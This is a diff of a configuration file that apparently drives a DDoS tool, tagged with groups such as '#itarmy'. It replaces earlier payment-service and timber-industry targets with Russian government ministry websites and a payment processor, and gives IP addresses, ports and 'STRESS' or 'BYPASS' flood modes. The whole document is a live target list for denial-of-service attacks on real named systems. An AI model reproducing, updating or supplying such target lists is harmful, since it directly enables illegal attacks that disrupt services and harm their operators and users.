@@ -1,34 +1,23 @@
 #zhnec
 
-https://qiwi.com https://checkout.qiwi.com https://my.qiwi.com https://oplata.qiwi.com https://p2p.qiwi.com --http-methods GET
-tcp://91.232.230.126:443 tcp://91.232.230.164:443 tcp://91.232.230.40:443 tcp://91.232.230.180:443 tcp://91.232.230.50:443 tcp://91.232.230.126:443 tcp://91.232.230.139:443
-
+https://minfin.gov.ru --http-methods GET STRESS
+tcp://195.80.224.185:443 tcp://195.80.224.149:10443 tcp://193.124.18.59:993 tcp://193.124.18.59:995 
+tcp://193.124.18.157:993 tcp://193.124.18.157:995 tcp://194.58.38.177:993 tcp://194.58.38.177:995
 
 
 #itarmy
 
-tcp://91.232.230.50:443 tcp://91.232.230.126:443 tcp://91.232.230.139:443 tcp://91.232.230.40:443 tcp://91.232.230.135:443 
-tcp://91.232.230.165:443 tcp://91.232.230.202:443 tcp://91.232.230.164:443 tcp://91.232.230.180:443 tcp://79.142.16.15:443 
-tcp://79.142.16.20:443 tcp://79.142.16.48:443 tcp://79.142.16.78:443 tcp://79.142.16.80:443 tcp://79.142.16.91:21
 
-#https://woodresource.ru tcp://80.87.197.227:22 tcp://80.87.197.227:80 tcp://80.87.197.227:443 --http-methods STRESS
-#https://old.woodresource.ru tcp://62.109.13.251:22 tcp://62.109.13.251:53 tcp://62.109.13.251:80 tcp://62.109.13.251:111 tcp://62.109.13.251:443 --http-methods STRESS
-#https://rosles.net tcp://87.236.16.235:21 tcp://87.236.16.235:80 tcp://87.236.16.235:443 --http-methods STRESS
-#https://lesoseka.com tcp://185.154.54.3:21 tcp://185.154.54.3:22 tcp://185.154.54.3:25 tcp://185.154.54.3:53 --http-methods STRESS
-#tcp://185.154.54.3:80 tcp://185.154.54.3:110 tcp://185.154.54.3:111 tcp://185.154.54.3:143 tcp://185.154.54.3:443 tcp://185.154.54.3:465
-#https://rosleshoz.gov.ru tcp://82.202.190.169:80 tcp://82.202.190.169:443 --http-methods STRESS
-#https://lesozagotovka.com tcp://5.23.51.63:21 tcp://5.23.51.63:22 tcp://5.23.51.63:80 tcp://5.23.51.63:443 --http-methods STRESS
-#https://lesegais.ru tcp://95.173.158.40:25 tcp://95.173.158.40:80 tcp://95.173.158.40:443 --http-methods STRESS
-#https://m.lesegais.ru tcp://95.173.158.38:80 tcp://95.173.158.38:443 --http-methods STRESS
-#https://www.lesprom.com/ru/ tcp://93.95.99.221:21 tcp://93.95.99.221:25 tcp://93.95.99.221:80 --http-methods STRESS
-#tcp://93.95.99.221:111 tcp://93.95.99.221:443 tcp://93.95.99.221:465 
-#https://www.lesonline.ru/ tcp://92.62.112.153:80 tcp://92.62.112.153:443 --http-methods STRESS
-#https://пиломатериалы.рф/ tcp://185.32.58.202:80 tcp://185.32.58.202:443 --http-methods STRESS
-#https://www.wood.ru/ tcp://83.222.4.160:80 tcp://83.222.4.160:443 --http-methods STRESS
+https://minfin.gov.ru tcp://195.80.224.185:80 tcp://195.80.224.185:443 --http-methods STRESS
+https://minjust.gov.ru/ tcp://95.173.157.26:80 tcp://95.173.157.26:443 --http-methods STRESS
+https://minenergo.gov.ru/ tcp://95.173.157.11:80 tcp://95.173.157.11:443 --http-methods STRESS
+http://www.minsport.gov.ru/ tcp://194.226.91.5:80 tcp://194.226.91.5:443 --http-methods STRESS
+https://minstroyrf.gov.ru/ tcp://185.183.174.114:80 tcp://185.183.174.114:443 --http-methods STRESS
+https://digital.gov.ru/ tcp://212.164.137.119:80 tcp://212.164.137.119:443 --http-methods STRESS
 
 
 #ddos separiv
 
 
-https://lug-info.com --http-methods GET 
+https://cloudpayments.ru --http-methods BYPASS 
 
